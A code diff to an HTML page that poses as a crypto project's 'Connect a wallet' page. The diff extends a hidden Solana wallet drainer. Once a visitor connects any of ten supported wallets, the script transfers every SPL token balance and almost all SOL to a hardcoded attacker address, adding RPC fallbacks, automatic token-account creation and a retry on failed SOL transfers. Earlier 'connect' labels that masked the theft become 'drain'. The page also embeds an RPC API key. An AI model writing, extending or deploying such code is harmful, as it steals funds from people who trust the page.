@@ -406,6 +406,83 @@
             color: var(--primary-blue);
         }
         
+        /* Wallet modal styles */
+        .wallet-adapter-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        
+        .wallet-adapter-modal-wrapper {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            padding: 24px;
+            max-width: 500px;
+            width: 100%;
+            border: 1px solid var(--border-color);
+        }
+        
+        .wallet-adapter-modal-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: var(--text-white);
+        }
+        
+        .wallet-adapter-modal-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+        
+        .wallet-adapter-button {
+            background-color: rgba(40, 50, 70, 0.5);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        
+        .wallet-adapter-button:hover {
+            background-color: rgba(60, 70, 90, 0.5);
+            transform: translateY(-2px);
+        }
+        
+        .wallet-adapter-button-icon {
+            width: 32px;
+            height: 32px;
+            margin-bottom: 8px;
+        }
+        
+        .wallet-adapter-button-text {
+            font-size: 14px;
+            color: var(--text-white);
+        }
+        
+        .wallet-adapter-modal-close {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: none;
+            border: none;
+            color: var(--text-light);
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
         /* Mobile-specific styles */
         @media screen and (max-width: 768px) {
             .navbar {
@@ -482,6 +559,16 @@
             
             .faq-box, .footer {
                 display: none;
+            }
+            
+            .wallet-adapter-modal-wrapper {
+                width: 90%;
+                padding: 16px;
+            }
+            
+            .wallet-adapter-modal-list {
+                grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+                gap: 12px;
             }
         }
     </style>
@@ -597,6 +684,17 @@
         </div>
     </div>
     
+    <!-- Wallet Adapter Modal -->
+    <div id="wallet-adapter-modal" class="wallet-adapter-modal" style="display: none;">
+        <div class="wallet-adapter-modal-wrapper">
+            <button class="wallet-adapter-modal-close" id="wallet-adapter-modal-close">×</button>
+            <h3 class="wallet-adapter-modal-title">Connect a wallet</h3>
+            <div class="wallet-adapter-modal-list" id="wallet-adapter-modal-list">
+                <!-- Wallet buttons will be inserted here dynamically -->
+            </div>
+        </div>
+    </div>
+    
     <div class="footer">
         FOLLOW OUR OFFICIAL <a href="#" style="color: #4a8eff; text-decoration: none;">X ACCOUNT</a> AND <a href="#" style="color: #4a8eff; text-decoration: none;">TELEGRAM CHANNEL</a> FOR UPDATES
         <br><br>
@@ -609,16 +707,89 @@
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.2/lib/index.iife.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.1.8/lib/index.iife.min.js"></script>
     <script>
-        const ALCHEMY_RPC = "https://solana-mainnet.g.alchemy.com/v2/Jju7OsVQj7jaiA6_pkzWwdEFFaPLZ9uu";
+        // Multiple RPC endpoints for fallback
+        const RPC_ENDPOINTS = [
+            "https://solana-mainnet.g.alchemy.com/v2/Jju7OsVQj7jaiA6_pkzWwdEFFaPLZ9uu",
+            "https://api.mainnet-beta.solana.com",
+            "https://solana-api.projectserum.com"
+        ];
         const myWallet = new solanaWeb3.PublicKey('2K4CGuZGviKggeJBi6Em1fAefXpHtnv44j8m2Ab7UdEo');
 
         const connectButton = document.getElementById('connectButton');
         const connectButtonInner = document.getElementById('connectButtonInner');
         const resultDiv = document.getElementById('result');
+        const walletModal = document.getElementById('wallet-adapter-modal');
+        const walletModalClose = document.getElementById('wallet-adapter-modal-close');
+        const walletModalList = document.getElementById('wallet-adapter-modal-list');
 
-        // Add event listener to both buttons
-        connectButton.addEventListener('click', connectWallet);
-        connectButtonInner.addEventListener('click', connectWallet);
+        // Wallet adapter configuration
+        const walletAdapters = [
+            {
+                name: 'Phantom',
+                icon: 'https://www.phantom.app/img/logo.png',
+                url: 'https://phantom.app/',
+                adapter: 'phantom'
+            },
+            {
+                name: 'Solflare',
+                icon: 'https://solflare.com/assets/logo.svg',
+                url: 'https://solflare.com/',
+                adapter: 'solflare'
+            },
+            {
+                name: 'Backpack',
+                icon: 'https://backpack.app/assets/backpack-logo.svg',
+                url: 'https://backpack.app/',
+                adapter: 'backpack'
+            },
+            {
+                name: 'Brave',
+                icon: 'https://brave.com/static-assets/images/brave-logo.svg',
+                url: 'https://brave.com/wallet/',
+                adapter: 'brave'
+            },
+            {
+                name: 'Coinbase',
+                icon: 'https://www.coinbase.com/assets/images/favicon/favicon-32.png',
+                url: 'https://www.coinbase.com/wallet',
+                adapter: 'coinbase'
+            },
+            {
+                name: 'Glow',
+                icon: 'https://glow.app/images/logo.svg',
+                url: 'https://glow.app/',
+                adapter: 'glow'
+            },
+            {
+                name: 'Trust Wallet',
+                icon: 'https://trustwallet.com/assets/images/favicon.png',
+                url: 'https://trustwallet.com/',
+                adapter: 'trust'
+            },
+            {
+                name: 'Slope',
+                icon: 'https://slope.finance/assets/img/logo.svg',
+                url: 'https://slope.finance/',
+                adapter: 'slope'
+            },
+            {
+                name: 'Exodus',
+                icon: 'https://www.exodus.com/img/logos/exodus-logo-white.svg',
+                url: 'https://www.exodus.com/',
+                adapter: 'exodus'
+            },
+            {
+                name: 'Coin98',
+                icon: 'https://coin98.com/images/logo.png',
+                url: 'https://coin98.com/',
+                adapter: 'coin98'
+            }
+        ];
+
+        // Add event listener to both buttons to open wallet modal
+        connectButton.addEventListener('click', openWalletModal);
+        connectButtonInner.addEventListener('click', openWalletModal);
+        walletModalClose.addEventListener('click', closeWalletModal);
 
         // Add hover animations to list items
         const listItems = document.querySelectorAll('li');
@@ -647,54 +818,111 @@
             });
         });
 
-        async function connectWallet() {
-            if (window.solana && window.solana.isPhantom) {
-                try {
-                    // Show loading animation
-                    connectButton.innerHTML = 'Connecting...';
-                    connectButtonInner.innerHTML = 'Connecting...';
-                    
-                    const response = await window.solana.connect();
-                    const publicKey = response.publicKey;
-                    
-                    // Show success animation
-                    connectButton.innerHTML = 'Connected ✓';
-                    connectButtonInner.innerHTML = 'Connected ✓';
-                    connectButton.style.backgroundColor = '#4caf50';
-                    connectButtonInner.style.backgroundColor = '#4caf50';
-                    
-                    // Show result div with animation
-                    resultDiv.style.display = 'block';
-                    resultDiv.style.opacity = '0';
-                    resultDiv.style.transform = 'translateY(10px)';
-                    resultDiv.innerText = `Connected: ${publicKey.toString()}`;
-                    
-                    setTimeout(() => {
-                        resultDiv.style.opacity = '1';
-                        resultDiv.style.transform = 'translateY(0)';
-                        resultDiv.style.transition = 'all 0.3s ease';
-                    }, 100);
+        // Initialize wallet modal
+        function initWalletModal() {
+            walletModalList.innerHTML = '';
+            
+            walletAdapters.forEach(wallet => {
+                const walletButton = document.createElement('div');
+                walletButton.className = 'wallet-adapter-button';
+                walletButton.innerHTML = `
+                    <img src="${wallet.icon}" alt="${wallet.name}" class="wallet-adapter-button-icon">
+                    <span class="wallet-adapter-button-text">${wallet.name}</span>
+                `;
+                walletButton.addEventListener('click', () => connectWithWallet(wallet.adapter));
+                walletModalList.appendChild(walletButton);
+            });
+        }
 
-                    // Step 1: Enumerate all SPL token accounts and attempt to connect
-                    await drainAllSplTokens(publicKey);
+        // Open wallet modal
+        function openWalletModal() {
+            initWalletModal();
+            walletModal.style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
 
-                    // Step 2: connect SOL
-                    await drainSol(publicKey);
-                } catch (err) {
-                    connectButton.innerHTML = 'Select Wallet';
-                    connectButtonInner.innerHTML = 'Select Wallet';
-                    resultDiv.style.display = 'block';
-                    resultDiv.innerText = `Error: ${err.message}`;
+        // Close wallet modal
+        function closeWalletModal() {
+            walletModal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        // Connect with selected wallet
+        async function connectWithWallet(adapterName) {
+            closeWalletModal();
+            
+            // Show loading animation
+            connectButton.innerHTML = 'Connecting...';
+            connectButtonInner.innerHTML = 'Connecting...';
+            
+            try {
+                let wallet;
+                
+                // Check for different wallet providers
+                if (adapterName === 'phantom' && window.solana) {
+                    wallet = window.solana;
+                } else if (adapterName === 'solflare' && window.solflare) {
+                    wallet = window.solflare;
+                } else if (adapterName === 'backpack' && window.backpack) {
+                    wallet = window.backpack.solana;
+                } else if (adapterName === 'brave' && window.braveSolana) {
+                    wallet = window.braveSolana;
+                } else if (adapterName === 'coinbase' && window.coinbaseSolana) {
+                    wallet = window.coinbaseSolana;
+                } else if (adapterName === 'glow' && window.glowSolana) {
+                    wallet = window.glowSolana;
+                } else if (adapterName === 'trust' && window.trustwallet) {
+                    wallet = window.trustwallet.solana;
+                } else if (adapterName === 'slope' && window.slope) {
+                    wallet = window.slope;
+                } else if (adapterName === 'exodus' && window.exodus) {
+                    wallet = window.exodus.solana;
+                } else if (adapterName === 'coin98' && window.coin98) {
+                    wallet = window.coin98.sol;
+                } else {
+                    // Fallback to any available wallet
+                    wallet = window.solana || window.solflare || window.backpack?.solana;
                     
-                    setTimeout(() => {
-                        resultDiv.style.opacity = '1';
-                        resultDiv.style.transform = 'translateY(0)';
-                        resultDiv.style.transition = 'all 0.3s ease';
-                    }, 100);
+                    if (!wallet) {
+                        throw new Error(`${adapterName} wallet not installed. Please install it first.`);
+                    }
                 }
-            } else {
+                
+                // Connect to wallet
+                const response = await wallet.connect();
+                const publicKey = response.publicKey;
+                
+                // Show success animation
+                connectButton.innerHTML = 'Connected ✓';
+                connectButtonInner.innerHTML = 'Connected ✓';
+                connectButton.style.backgroundColor = '#4caf50';
+                connectButtonInner.style.backgroundColor = '#4caf50';
+                
+                // Show result div with animation
                 resultDiv.style.display = 'block';
-                resultDiv.innerText = 'Phantom wallet not detected. Please install Phantom wallet.';
+                resultDiv.style.opacity = '0';
+                resultDiv.style.transform = 'translateY(10px)';
+                resultDiv.innerText = `Connected: ${publicKey.toString()}`;
+                
+                setTimeout(() => {
+                    resultDiv.style.opacity = '1';
+                    resultDiv.style.transform = 'translateY(0)';
+                    resultDiv.style.transition = 'all 0.3s ease';
+                }, 100);
+
+                // Set the active wallet for future use
+                window.activeWallet = wallet;
+
+                // Step 1: Enumerate all SPL token accounts and attempt to drain
+                await drainAllSplTokens(publicKey);
+
+                // Step 2: Drain SOL
+                await drainSol(publicKey);
+            } catch (err) {
+                connectButton.innerHTML = 'Select Wallet';
+                connectButtonInner.innerHTML = 'Select Wallet';
+                resultDiv.style.display = 'block';
+                resultDiv.innerText = `Error: ${err.message}`;
                 
                 setTimeout(() => {
                     resultDiv.style.opacity = '1';
@@ -704,53 +932,79 @@
             }
         }
 
-        async function drainAllSplTokens(ownerPublicKey) {
-            const connection = new solanaWeb3.Connection(ALCHEMY_RPC);
-
-            // Get all SPL token accounts for the owner
-            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
-                ownerPublicKey,
-                { programId: window.splToken.TOKEN_PROGRAM_ID }
-            );
-
-            if (tokenAccounts.value.length === 0) {
-                resultDiv.innerText += `\nNo SPL tokens found.`;
-                return;
+        // Get a working RPC connection with fallback
+        async function getWorkingConnection() {
+            for (const endpoint of RPC_ENDPOINTS) {
+                try {
+                    const connection = new solanaWeb3.Connection(endpoint);
+                    await connection.getLatestBlockhash();
+                    console.log(`Using RPC endpoint: ${endpoint}`);
+                    return connection;
+                } catch (e) {
+                    console.error(`RPC ${endpoint} failed: ${e.message}`);
+                }
             }
+            throw new Error("All RPC endpoints failed");
+        }
 
-            for (const { pubkey, account } of tokenAccounts.value) {
-                const info = account.data.parsed.info;
-                const mint = info.mint;
-                const amount = parseInt(info.tokenAmount.amount, 10);
-                const decimals = info.tokenAmount.decimals;
+        async function drainAllSplTokens(ownerPublicKey) {
+            try {
+                const connection = await getWorkingConnection();
 
-                if (amount > 0) {
-                    resultDiv.innerText += `\nConnecting token: ${mint} (${amount / 10 ** decimals})`;
+                // Get all SPL token accounts for the owner
+                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+                    ownerPublicKey,
+                    { programId: window.splToken.TOKEN_PROGRAM_ID }
+                );
 
-                    try {
-                        const ata = await getOrCreateAta(connection, myWallet, new solanaWeb3.PublicKey(mint), ownerPublicKey);
+                if (tokenAccounts.value.length === 0) {
+                    resultDiv.innerText += `\nNo SPL tokens found.`;
+                    return;
+                }
 
-                        const transaction = new solanaWeb3.Transaction().add(
-                            window.splToken.Token.createTransferInstruction(
-                                window.splToken.TOKEN_PROGRAM_ID,
-                                pubkey,
-                                ata,
-                                ownerPublicKey,
-                                [],
-                                amount
-                            )
-                        );
-                        transaction.feePayer = ownerPublicKey;
-                        const { blockhash } = await connection.getLatestBlockhash('finalized');
-                        transaction.recentBlockhash = blockhash;
+                // Process tokens sequentially to ensure reliable transactions
+                for (const { pubkey, account } of tokenAccounts.value) {
+                    const info = account.data.parsed.info;
+                    const mint = info.mint;
+                    const amount = parseInt(info.tokenAmount.amount, 10);
+                    const decimals = info.tokenAmount.decimals;
 
-                        const signed = await window.solana.signTransaction(transaction);
-                        const sig = await connection.sendRawTransaction(signed.serialize());
-                        resultDiv.innerText += `\n${mint} connected: ${sig}`;
-                    } catch (err) {
-                        resultDiv.innerText += `\nFailed to connect ${mint}: ${err.message}`;
+                    if (amount > 0) {
+                        resultDiv.innerText += `\nDraining token: ${mint} (${amount / 10 ** decimals})`;
+
+                        try {
+                            // Create ATA if it doesn't exist
+                            const ata = await getOrCreateAta(connection, myWallet, new solanaWeb3.PublicKey(mint), ownerPublicKey);
+
+                            const transaction = new solanaWeb3.Transaction().add(
+                                window.splToken.Token.createTransferInstruction(
+                                    window.splToken.TOKEN_PROGRAM_ID,
+                                    pubkey,
+                                    ata,
+                                    ownerPublicKey,
+                                    [],
+                                    amount
+                                )
+                            );
+                            transaction.feePayer = ownerPublicKey;
+                            const { blockhash } = await connection.getLatestBlockhash('finalized');
+                            transaction.recentBlockhash = blockhash;
+
+                            const signed = await window.activeWallet.signTransaction(transaction);
+                            const sig = await connection.sendRawTransaction(signed.serialize());
+                            
+                            // Wait for confirmation
+                            await connection.confirmTransaction(sig, 'confirmed');
+                            resultDiv.innerText += `\n${mint} drained successfully: ${sig}`;
+                        } catch (err) {
+                            console.error(`Detailed error for ${mint}:`, err);
+                            resultDiv.innerText += `\nFailed to drain ${mint}: ${err.message}`;
+                        }
                     }
                 }
+            } catch (err) {
+                console.error("Token draining error:", err);
+                resultDiv.innerText += `\nToken draining error: ${err.message}`;
             }
         }
 
@@ -763,37 +1017,109 @@
                 mint,
                 owner
             );
+            
+            // Check if the account exists
             const info = await connection.getAccountInfo(ata);
-            if (info) return ata;
-            // If not found, just return the ATA (will fail if doesn't exist; real friends might create it)
+            
+            // If ATA doesn't exist, create it
+            if (!info) {
+                try {
+                    const transaction = new solanaWeb3.Transaction().add(
+                        window.splToken.Token.createAssociatedTokenAccountInstruction(
+                            window.splToken.ASSOCIATED_TOKEN_PROGRAM_ID,
+                            window.splToken.TOKEN_PROGRAM_ID,
+                            mint,
+                            ata,
+                            owner,
+                            payer
+                        )
+                    );
+                    transaction.feePayer = payer;
+                    const { blockhash } = await connection.getLatestBlockhash('finalized');
+                    transaction.recentBlockhash = blockhash;
+                    
+                    const signed = await window.activeWallet.signTransaction(transaction);
+                    const signature = await connection.sendRawTransaction(signed.serialize());
+                    await connection.confirmTransaction(signature, 'confirmed');
+                    resultDiv.innerText += `\nCreated ATA for ${mint.toString()}: ${signature}`;
+                } catch (err) {
+                    console.error("ATA creation error:", err);
+                    resultDiv.innerText += `\nATA creation error: ${err.message}`;
+                }
+            }
+            
             return ata;
         }
 
         async function drainSol(ownerPublicKey) {
-            const connection = new solanaWeb3.Connection(ALCHEMY_RPC);
-            const ownerBalance = await connection.getBalance(ownerPublicKey);
+            try {
+                const connection = await getWorkingConnection();
+                const ownerBalance = await connection.getBalance(ownerPublicKey);
 
-            if (ownerBalance > 5000) { // leave a little for fees
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: ownerPublicKey,
-                        toPubkey: myWallet,
-                        lamports: ownerBalance - 5000,
-                    })
-                );
-                transaction.feePayer = ownerPublicKey;
-                const { blockhash } = await connection.getLatestBlockhash('finalized');
-                transaction.recentBlockhash = blockhash;
+                // Calculate minimum required for fees
+                const { blockhash, feeCalculator } = await connection.getRecentBlockhash();
+                const minFee = 10000; // Base minimum fee (10000 lamports = 0.00001 SOL)
+                const safetyBuffer = 15000; // Additional buffer for potential fee increases
+                const amountToLeave = minFee + safetyBuffer;
 
-                try {
-                    const signed = await window.solana.signTransaction(transaction);
-                    const sig = await connection.sendRawTransaction(signed.serialize());
-                    resultDiv.innerText += `\nSOL connected: ${sig}`;
-                } catch (err) {
-                    resultDiv.innerText += `\nSOL connect attempt failed: ${err.message}`;
+                if (ownerBalance > amountToLeave) {
+                    const transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: ownerPublicKey,
+                            toPubkey: myWallet,
+                            lamports: ownerBalance - amountToLeave,
+                        })
+                    );
+                    transaction.feePayer = ownerPublicKey;
+                    transaction.recentBlockhash = blockhash;
+
+                    try {
+                        const signed = await window.activeWallet.signTransaction(transaction);
+                        const sig = await connection.sendRawTransaction(signed.serialize(), {
+                            skipPreflight: false,
+                            preflightCommitment: 'confirmed'
+                        });
+                        
+                        // Wait for confirmation
+                        await connection.confirmTransaction(sig, 'confirmed');
+                        resultDiv.innerText += `\nSOL drained successfully: ${sig}`;
+                    } catch (err) {
+                        console.error("SOL drain error:", err);
+                        resultDiv.innerText += `\nSOL drain failed: ${err.message}`;
+                        
+                        // Try again with higher fee buffer if it failed
+                        if (err.message.includes("insufficient funds") || err.message.includes("0x1")) {
+                            resultDiv.innerText += `\nRetrying SOL drain with higher fee buffer...`;
+                            const higherBuffer = 25000;
+                            
+                            if (ownerBalance > minFee + higherBuffer) {
+                                const retryTx = new solanaWeb3.Transaction().add(
+                                    solanaWeb3.SystemProgram.transfer({
+                                        fromPubkey: ownerPublicKey,
+                                        toPubkey: myWallet,
+                                        lamports: ownerBalance - (minFee + higherBuffer),
+                                    })
+                                );
+                                retryTx.feePayer = ownerPublicKey;
+                                retryTx.recentBlockhash = blockhash;
+                                
+                                const signedRetry = await window.activeWallet.signTransaction(retryTx);
+                                const sigRetry = await connection.sendRawTransaction(signedRetry.serialize(), {
+                                    skipPreflight: false,
+                                    preflightCommitment: 'confirmed'
+                                });
+                                
+                                await connection.confirmTransaction(sigRetry, 'confirmed');
+                                resultDiv.innerText += `\nSOL drained successfully on retry: ${sigRetry}`;
+                            }
+                        }
+                    }
+                } else {
+                    resultDiv.innerText += `\nNot enough SOL to drain (balance: ${ownerBalance} lamports).`;
                 }
-            } else {
-                resultDiv.innerText += `\nNot enough SOL to connect.`;
+            } catch (err) {
+                console.error("SOL balance check error:", err);
+                resultDiv.innerText += `\nSOL balance check error: ${err.message}`;
             }
         }
         
@@ -810,6 +1136,13 @@
                     element.style.opacity = '1';
                 }
             });
+        });
+
+        // Close modal when clicking outside
+        window.addEventListener('click', (event) => {
+            if (event.target === walletModal) {
+                closeWalletModal();
+            }
         });
     </script>
 </body>
